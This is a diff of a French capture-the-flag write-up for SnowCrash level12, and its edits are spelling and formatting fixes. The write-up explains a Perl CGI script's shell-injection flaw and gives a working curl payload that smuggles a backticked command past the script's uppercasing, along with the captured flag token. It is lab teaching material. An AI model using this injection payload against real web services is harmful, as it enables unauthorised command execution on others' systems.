@@ -1,6 +1,6 @@
 #level12
 
-1) un simple `ls` permet de trouver un fichier perl nommer level12.pl. lorsque on l'execute il affiche ceci:
+1) un simple `ls` permet de trouver un fichier perl nomme `level12.pl`. Lorsque on l'execute il affiche ceci:
 
 ```
 Content-type: text/html
@@ -8,7 +8,7 @@ Content-type: text/html
 ..
 ```
 
-2) si on lis le code perl cela donne ca:
+2) si on li le code perl cela donne ca:
 
 ```perl
 #!/usr/bin/env perl
@@ -42,32 +42,31 @@ sub n {
 n(t(param("x"), param("y")));
 ```
 
-en resumer ce programe perl fait : 
+en resume ce programe perl : 
 
-```
-1. prend le premier argument x sur le port 4646
-2. Uppercase x
-3. Retire tous apres le premier mots
-4. recherche dans /tmp/xd pour une ligne contenant x
-5. separe toute les ligne trouver par ':'
-6. compare chaque champs trouver avec y
-7. Retourne 1 si ca match y
-8. sinon retourne 0
-9. enfin la fonction affiche soit : '.' si y a match, soit '..' si cela na pas match
-```
+ - prend le premier argument `x` sur le port `4646`
+ - Uppercase `x`
+ - Retire tous apres le premier mots
+ - recherche dans `/tmp/xd` pour une ligne contenant `x`
+ - separe toute les lignes trouvees par `:`
+ - compare chaque champ trouve avec `y`
+ - Retourne 1 si ca match `y`
+ - sinon retourne 0
+ - enfin la fonction affiche soit : `.` si y a match, soit `..` si cela na pas match
 
 et le plus beau dans tout ca c'est que tout ce si ne sert a rien...
 
-3) En effet il y a une vulnerabilter shell comme pour le level04 sur la ligne:
+3) En effet il y a une vulnerabilte shell comme pour le `level04` sur la ligne:
 
 ```
 @output = `egrep "^$xx" /tmp/xd 2>&1`;
 ```
-en effet cette ligne vas executer ce qu'on lui donne en argument en shell. on peut donc detourner le CGI pour qu'il execute getflag a notre place
 
-4) Cependant il y a un garde fou, l'argument que l'on envoi sur le serveur vas etre upper case par `$xx =~ tr/a-z/A-Z/;`. On ne peut donc pas directement envoyer `$(getflag)`
+en effet cette ligne vas executer ce qu'on lui donne en argument en shell. On peut donc detourner le CGI pour qu'il execute `getflag` a notre place
 
-5) la solution que nous avons trouver est de creer un petit scrip bash aevc un nom en UPPER_CASE qui vas executer `getflag` : 
+4) Cependant il y a un garde fou, l'argument que l'on envoie sur le serveur va etre uppercase par `$xx =~ tr/a-z/A-Z/;`. On ne peut donc pas directement envoyer `$(getflag)`
+
+5) la solution que nous avons trouve est de creer un petit script bash avec un nom en UPPER_CASE qui va executer `getflag` : 
 
 ```sh
 #!/bin/sh
@@ -75,7 +74,7 @@ en effet cette ligne vas executer ce qu'on lui donne en argument en shell. on pe
 getflag > /tmp/flag12
 ```
 
-ensuite il ne reste plus qu'as faire en sorte que le serveur trouve et execute notre script : 
+ensuite il ne reste plus qu'a faire en sorte que le serveur trouve et execute notre script : 
 
 ```sh
 level12@SnowCrash:~$ echo "getflag > /tmp/flag.txt" > /tmp/PAS_GET_FLAG
@@ -83,6 +82,4 @@ level12@SnowCrash:~$ chmod 777 /tmp/PAS_GET_FLAG
 level12@SnowCrash:~$ curl "http://localhost:4646/?x=\`\/*\/PAS_GET_FLAG\`"
 ..level12@SnowCrash:~$ cat /tmp/flag.txt
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
-level12@SnowCrash:~$ 
-
 ```
